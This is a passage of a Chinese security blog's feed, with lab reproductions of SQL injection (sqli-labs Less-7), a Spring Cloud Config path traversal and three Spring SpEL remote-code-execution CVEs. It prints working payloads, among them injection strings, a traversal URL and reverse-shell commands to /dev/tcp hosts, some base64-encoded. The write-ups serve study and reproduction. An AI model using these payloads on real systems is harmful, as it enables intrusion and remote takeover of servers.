    <summary type="html">&lt;h2 id=&quot;Less7&quot;&gt;&lt;a href=&quot;#Less7&quot; class=&quot;headerlink&quot; title=&quot;Less7&quot;&gt;&lt;/a&gt;Less7&lt;/h2&gt;&lt;p&gt;本关利用文件导入的方式进行注入&lt;/p&gt;
&lt;p&gt;查看源码，重点关注对id参数的处理和sql语句上，源代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$sql&amp;#x3D;&amp;quot;SELECT * FROM users WHERE id&amp;#x3D;((&amp;#39;$id&amp;#39;)) LIMIT 0,1&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这里对id参数进行了’))处理，所以可以尝试&lt;code&gt;&amp;#39;)) or 1=1--+&lt;/code&gt;进行注入&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020100201.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;我们这里利用上述提到的文件导入的方式进行演示：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;http:&amp;#x2F;&amp;#x2F;127.0.0.1&amp;#x2F;sqli-labs&amp;#x2F;Less-7&amp;#x2F;?id&amp;#x3D;1&amp;#39;))UNION SELECT 1,2,3 into outfile &amp;quot;D:\\phpStudy\\WWW\\sqli-labs\\Less-7\\1.txt&amp;quot;--+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020100202.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;p&gt;上图中显示sql语句出错了，但是文件中可以看到1.txt已经生成了。&lt;/p&gt;</summary>
    
    
    
    <category term="sqli-labs靶场" scheme="https://hzktester.top/categories/sqli-labs%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="sqli-labs" scheme="https://hzktester.top/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>Spring Cloud Config 目录穿越漏洞复现（CVE-2020-5410）</title>
    <link href="https://hzktester.top/posts/a05af4c0.html"/>
    <id>https://hzktester.top/posts/a05af4c0.html</id>
    <published>2020-09-29T09:30:00.000Z</published>
    <updated>2020-10-20T09:21:51.061Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Spring Cloud Config 为分布式系统中的外部配置提供服务器和客户端支持，使用 Config Server ，用户可以在所有环境中管理应用程序的外部属性。<br>近日，百度云安全团队监测到 Spring Cloud Config 官方发布了一个目录遍历漏洞的风险通告，漏洞编号为 CVE-2020-5410 。攻击者可通过构造特殊的 HTTP 请求，从而跨目录读取文件。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>2.2.x&lt;=2.2.2 2.1.x&lt;=2.1.8</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>使用vulfocus启动漏洞环境</p><p><img src="https://qiniu.hzktester.top/tp2020092923.png" alt="image"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>直接访问<br><code>http://47.101.62.20:48259/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Ftmp%23foo/development</code></p><p><img src="https://qiniu.hzktester.top/tp2020092924.png" alt="image"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;Spring Cloud Config 为分布式系统中的外部配置提供服务器和客户端支持，使用 Config Server ，用户可以在所有环境中管理应用程序的外部属性。&lt;br&gt;近日，百度云安全团队监测到 Spring Cloud Config 官方发布了一个目录遍历漏洞的风险通告，漏洞编号为 CVE-2020-5410 。攻击者可通过构造特殊的 HTTP 请求，从而跨目录读取文件。&lt;/p&gt;
&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;2.2.x&amp;lt;=2.2.2 2.1.x&amp;lt;=2.1.8&lt;/p&gt;
&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;p&gt;使用vulfocus启动漏洞环境&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020092923.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;漏洞复现&quot;&gt;&lt;a href=&quot;#漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;漏洞复现&quot;&gt;&lt;/a&gt;漏洞复现&lt;/h2&gt;&lt;p&gt;直接访问&lt;br&gt;&lt;code&gt;http://47.101.62.20:48259/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Ftmp%23foo/development&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020092924.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://hzktester.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Spring" scheme="https://hzktester.top/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）</title>
    <link href="https://hzktester.top/posts/71711a88.html"/>
    <id>https://hzktester.top/posts/71711a88.html</id>
    <published>2020-09-29T09:02:00.000Z</published>
    <updated>2020-10-20T09:21:51.062Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Spring Data Commons 1.13 - 1.13.10(Ingalls SR10)</p><p>Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)</p><p>Spring Data Commons 2.0 - 2.0.5 (Kay SR5)</p><p>Spring Data REST 3.0 - 3.0.5 (Kay SR5)</p><p>已不支持的旧版本</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;vulhub&#x2F;spring&#x2F;CVE-2018-1273&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>稍等一会，环境启动后，访问<code>http://your-ip:8080/users</code>，将可以看到一个用户注册页面。</p><p><img src="https://qiniu.hzktester.top/tp2020092917.png" alt="image"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>填写信息，点击<code>Register user</code> 然后抓包</p><p><img src="https://qiniu.hzktester.top/tp2020092918.png" alt="image"></p><p>修改<code>username</code>参数POC并发包:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&quot;touch &#x2F;tmp&#x2F;success&quot;)]&#x3D;</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020092919.png" alt="image"></p><p>进入docker容器查看：</p><p><img src="https://qiniu.hzktester.top/tp2020092920.png" alt="image"></p><p>修改poc为反弹shell：<br>还是先base64编码，再url编码后发包:</p><p><img src="https://qiniu.hzktester.top/tp2020092921.png" alt="image"></p><p>反弹shell成功：</p><p><img src="https://qiniu.hzktester.top/tp2020092922.png" alt="image"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;Spring Data是一个用于简化数据库访问，并支持云服务的开源框架，Spring Data Commons是Spring Data下所有子项目共享的基础框架。Spring Data Commons 在2.0.5及以前版本中，存在一处SpEL表达式注入漏洞，攻击者可以注入恶意SpEL表达式以执行任意命令。&lt;/p&gt;
&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Spring Data Commons 1.13 - 1.13.10(Ingalls SR10)&lt;/p&gt;
&lt;p&gt;Spring Data REST 2.6 - 2.6.10 (Ingalls SR10)&lt;/p&gt;
&lt;p&gt;Spring Data Commons 2.0 - 2.0.5 (Kay SR5)&lt;/p&gt;
&lt;p&gt;Spring Data REST 3.0 - 3.0.5 (Kay SR5)&lt;/p&gt;
&lt;p&gt;已不支持的旧版本&lt;/p&gt;
&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cd &amp;#x2F;vulhub&amp;#x2F;spring&amp;#x2F;CVE-2018-1273&amp;#x2F;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://hzktester.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Spring" scheme="https://hzktester.top/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>Spring Data REST PATCH 请求代码执行漏洞复现（CVE-2017-8046）</title>
    <link href="https://hzktester.top/posts/eea09eec.html"/>
    <id>https://hzktester.top/posts/eea09eec.html</id>
    <published>2020-09-29T08:04:00.000Z</published>
    <updated>2020-10-20T09:21:51.062Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Spring Data REST是Spring Data项目的一部分，可以轻松地在Spring Data存储库之上构建超媒体驱动的REST Web服务。</p><p>恶意的PATCH请求使用精心构造的JSON数据提交到spring-data-rest服务可以执行任意JAVA代码</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Spring Data REST versions prior to 2.5.12, 2.6.7, 3.0 RC3</p><p>可以查看spring-data-rest-webmvc jar包的版本</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;vulhub&#x2F;spring&#x2F;CVE-2017-8046&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>等待环境启动完成，然后访问<a href="http://your-ip:8080/%E5%8D%B3%E5%8F%AF%E7%9C%8B%E5%88%B0json%E6%A0%BC%E5%BC%8F%E7%9A%84%E8%BF%94%E5%9B%9E%E5%80%BC%EF%BC%8C%E8%AF%B4%E6%98%8E%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AARestful%E9%A3%8E%E6%A0%BC%E7%9A%84API%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%82">http://your-ip:8080/即可看到json格式的返回值，说明这是一个Restful风格的API服务器。</a></p><p><img src="https://qiniu.hzktester.top/tp2020092912.png" alt="image"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>http://your-ip:8080/customers/1</code>，看到一个资源。我们使用<code>PATCH</code>请求来修改之：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PATCH &#x2F;customers&#x2F;1 HTTP&#x2F;1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;json-patch+json</span><br><span class="line">Content-Length: 202</span><br><span class="line"></span><br><span class="line">[&#123; &quot;op&quot;: &quot;replace&quot;, &quot;path&quot;: &quot;T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]&#123;116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115&#125;))&#x2F;lastname&quot;, &quot;value&quot;: &quot;vulhub&quot; &#125;]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>path的值是SpEL表达式，发送上述数据包，将执行<code>new byte[]&#123;116,111,117,99,104,32,47,116,109,112,47,115,117,99,99,101,115,115&#125;</code>表示的命令<code>ouch /tmp/success</code>。</p><p><img src="https://qiniu.hzktester.top/tp2020092913.png" alt="image"></p><p>然后进入容器<code>docker exec -it 容器id /bin/bash</code>看看：</p><p><img src="https://qiniu.hzktester.top/tp2020092914.png" alt="image"></p><p>制作反弹shell的POC:</p><p>命令：<code>bash -i &gt;&amp; /dev/tcp/10.10.10.10/7777 0&gt;&amp;1</code></p><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">base64编码</a>：<code>bash -c &#123;echo,YGJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTAuMTAvNzc3NyAwPiYxYA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p><p>通过下面的python代码将每个字符转为对应的十进制：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; b&#39;这里填poc&#39;</span><br><span class="line">bytecode &#x3D; &#39;,&#39;.join(str(i) for i in list(payload))</span><br><span class="line">print(bytecode)</span><br></pre></td></tr></table></figure><p><img src="https://qiniu.hzktester.top/tp2020092915.png" alt="image"></p><p>重新发包修改为反弹shell的poc：</p><p><img src="https://qiniu.hzktester.top/tp2020092916.png" alt="image"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;漏洞描述&quot;&gt;&lt;a href=&quot;#漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;漏洞描述&quot;&gt;&lt;/a&gt;漏洞描述&lt;/h2&gt;&lt;p&gt;Spring Data REST是Spring Data项目的一部分，可以轻松地在Spring Data存储库之上构建超媒体驱动的REST Web服务。&lt;/p&gt;
&lt;p&gt;恶意的PATCH请求使用精心构造的JSON数据提交到spring-data-rest服务可以执行任意JAVA代码&lt;/p&gt;
&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Spring Data REST versions prior to 2.5.12, 2.6.7, 3.0 RC3&lt;/p&gt;
&lt;p&gt;可以查看spring-data-rest-webmvc jar包的版本&lt;/p&gt;
&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cd &amp;#x2F;vulhub&amp;#x2F;spring&amp;#x2F;CVE-2017-8046&amp;#x2F;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;等待环境启动完成，然后访问&lt;a href=&quot;http://your-ip:8080/%E5%8D%B3%E5%8F%AF%E7%9C%8B%E5%88%B0json%E6%A0%BC%E5%BC%8F%E7%9A%84%E8%BF%94%E5%9B%9E%E5%80%BC%EF%BC%8C%E8%AF%B4%E6%98%8E%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AARestful%E9%A3%8E%E6%A0%BC%E7%9A%84API%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%82&quot;&gt;http://your-ip:8080/即可看到json格式的返回值，说明这是一个Restful风格的API服务器。&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020092912.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://hzktester.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Spring" scheme="https://hzktester.top/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>Spring WebFlow 远程代码执行漏洞（CVE-2017-4971）</title>
    <link href="https://hzktester.top/posts/f3c13ec6.html"/>
    <id>https://hzktester.top/posts/f3c13ec6.html</id>
    <published>2020-09-29T07:31:00.000Z</published>
    <updated>2020-10-20T09:21:51.066Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Spring WebFlow 2.4.0 – 2.4.4</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;vulhub&#x2F;spring&#x2F;CVE-2017-4971&#x2F;</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>等待环境启动后，访问<code>http://your-ip:8080</code>，将看到一个酒店预订的页面，这是<code>spring-webflow</code>官方给的简单示例。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先访问<code>http://your-ip:8080/login</code>，用页面左边给出的任意一个账号/密码登录系统：</p><p><img src="https://qiniu.hzktester.top/tp2020092905.png" alt="image"></p><p>然后访问id为1的酒店<code>http://your-ip:8080/hotels/1</code>，点击预订按钮“Book Hotel”，填写相关信息后点击“Proceed”（从这一步，其实WebFlow就正式开始了）：</p><p><img src="https://qiniu.hzktester.top/tp2020092906.png" alt="image"></p><p>再点击确认“Confirm”，此时抓包：</p><p><img src="https://qiniu.hzktester.top/tp2020092907.png" alt="image"></p><p><img src="https://qiniu.hzktester.top/tp2020092908.png" alt="image"></p><p>我们向其中添加一个字段（也就是反弹shell的POC）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_(new java.lang.ProcessBuilder(&quot;bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;21 0&gt;&amp;1&quot;)).start()&#x3D;vulhub</span><br></pre></td></tr></table></figure><p>把反弹shell的POC进行URL编码</p><p><img src="https://qiniu.hzktester.top/tp2020092909.png" alt="image"></p><p>重放数据包</p><p><img src="https://qiniu.hzktester.top/tp2020092910.png" alt="image"></p><p>成功反弹shell</p><p><img src="https://qiniu.hzktester.top/tp2020092911.png" alt="image"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;Spring WebFlow 是一个适用于开发基于流程的应用程序的框架（如购物逻辑），可以将流程的定义和实现流程行为的类和视图分离开来。在其 2.4.x 版本中，如果我们控制了数据绑定时的field，将导致一个SpEL表达式注入漏洞，最终造成任意命令执行。&lt;/p&gt;
&lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;Spring WebFlow 2.4.0 – 2.4.4&lt;/p&gt;
&lt;h2 id=&quot;环境搭建&quot;&gt;&lt;a href=&quot;#环境搭建&quot; class=&quot;headerlink&quot; title=&quot;环境搭建&quot;&gt;&lt;/a&gt;环境搭建&lt;/h2&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cd &amp;#x2F;vulhub&amp;#x2F;spring&amp;#x2F;CVE-2017-4971&amp;#x2F;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;docker-compose up -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;等待环境启动后，访问&lt;code&gt;http://your-ip:8080&lt;/code&gt;，将看到一个酒店预订的页面，这是&lt;code&gt;spring-webflow&lt;/code&gt;官方给的简单示例。&lt;/p&gt;
&lt;h2 id=&quot;漏洞复现&quot;&gt;&lt;a href=&quot;#漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;漏洞复现&quot;&gt;&lt;/a&gt;漏洞复现&lt;/h2&gt;&lt;p&gt;首先访问&lt;code&gt;http://your-ip:8080/login&lt;/code&gt;，用页面左边给出的任意一个账号/密码登录系统：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://qiniu.hzktester.top/tp2020092905.png&quot; alt=&quot;image&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="漏洞复现" scheme="https://hzktester.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="Spring" scheme="https://hzktester.top/tags/Spring/"/>
    
  </entry>
  
</feed>
